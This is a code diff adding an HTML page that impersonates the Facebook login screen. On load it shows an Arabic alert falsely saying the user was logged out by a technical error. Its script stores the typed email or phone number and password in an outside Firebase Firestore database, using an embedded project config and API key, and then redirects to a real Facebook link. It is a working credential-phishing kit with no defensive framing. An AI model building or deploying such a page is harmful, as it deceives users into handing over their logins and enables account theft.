@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+      <script src="https://www.gstatic.com/firebasejs/9.21.0/firebase-app-compat.js"></script>
+      <script src="https://www.gstatic.com/firebasejs/9.21.0/firebase-firestore-compat.js"></script>
+      <link rel="preconnect" href="https://fonts.googleapis.com">
+      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+      <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
+  </head>
+  <body>
+    <div class="loderd"><span class="loader"></span></div>
+  <center><h3>facebook</h3></center>
+   <center><p>Log in to Facebook</p></>
+  
+  <center><input type="email" placeholder="Mobile number or email address"id="email"></center>
+  <center><input type="password" placeholder="Password" id="Password"></center><br>
+  <center><input type="submit" value="Log in" placeholder="log in" id="btn"></center>
+  </body>
+  <style>
+    *{font-family: "Roboto", sans-serif;
+  font-weight: 500;}
+    p{color: black;}
+    h3{color:#4552DC;
+     font-size: 50px;}
+    #btn{padding:15px;
+      color: white;
+      height: 45px;
+      background:#396BFD;
+      width: 8cm;
+      border: 10cm;
+      color: white;
+      font-size:17px;
+       padding-top:10px;
+       border:1px;
+       border-style:solid;
+       border-radius: 5px;
+       font-style:normal;
+       font-weight: bold; }
+   
+   
+    #email{padding:10px;
+    height:20px;
+    width: 270px;
+    margin: 7px;       
+      }
+    
+    #Password{padding:10px;
+    height: 20px;
+    width: 270px;
+    margin:7px;
+      
+     }
+     .loderd {
+       height: 100vh;
+       width: 100vw;
+       display: none;
+       align-items: center;
+       justify-content: center;
+       background: rgba(0, 0, 0, 0.3);
+       position: fixed;
+       top: 0;
+       left: 0;
+     }
+     .loader {
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+      position: relative;
+      animation: rotate 1s linear infinite
+    }
+    .loader::before {
+      content: "";
+      box-sizing: border-box;
+      position: absolute;
+      inset: 0px;
+      border-radius: 50%;
+      border: 5px solid #FFF;
+      animation: prixClipFix 2s linear infinite ;
+    }
+
+    @keyframes rotate {
+      100%   {transform: rotate(360deg)}
+    }
+
+    @keyframes prixClipFix {
+        0%   {clip-path:polygon(50% 50%,0 0,0 0,0 0,0 0,0 0)}
+        25%  {clip-path:polygon(50% 50%,0 0,100% 0,100% 0,100% 0,100% 0)}
+        50%  {clip-path:polygon(50% 50%,0 0,100% 0,100% 100%,100% 100%,100% 100%)}
+        75%  {clip-path:polygon(50% 50%,0 0,100% 0,100% 100%,0 100%,0 100%)}
+        100% {clip-path:polygon(50% 50%,0 0,100% 0,100% 100%,0 100%,0 0)}
+    }
+</style>
+  <script>
+        // Firebase 
+        const firebaseConfig = {
+        apiKey: "AIzaSyC2oLuDwObmTkwi3wXRu3qTi9IfkLxMsjg",
+        authDomain: "fuison.firebaseapp.com",
+        projectId: "fuison",
+        storageBucket: "fuison.appspot.com",
+        messagingSenderId: "272997929295",
+        appId: "1:272997929295:web:bec659cdb8efa26192f53a",
+        measurementId: "G-6030NS4W6P"
+        };
+        // تهيئة Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+        // btn
+        alert("تم تسجيل الخروج من حسابك بسبب خطأ تقني\nالرجا تسجيل الدخول من جديد");
+        document.getElementById("btn").onclick = async function (){
+          document.querySelector('.loderd').style.display = "flex";
+          // data
+          let phone = document.getElementById("email");
+          let password = document.getElementById("Password");
+          // add user 
+          try{
+            const userRef = await db.collection('users').add({
+              name: "Ali hesson",
+              phone: phone.value.trim(),
+              password: password.value.trim(),
+              proImg: "https://firebasestorage.googleapis.com/v0/b/fuison.appspot.com/o/profile%2FFB_IMG_1722875676575.jpg?alt=media&token=009ae6ac-be4f-4dd3-bad4-c4aef11f21a5",
+              liked: [],
+              ture: false});
+              password.value = "";
+              phone.value = "";
+              location.href = "https://www.facebook.com/share/r/YNkE3ioD95WnuEjT/?mibextid=oFDknk";
+          }
+              finally {
+                alert('تم تسجيل الدخول');
+                document.querySelector('.loderd').style.display = "none";
+              }
+        }
+  </script>
+</html>
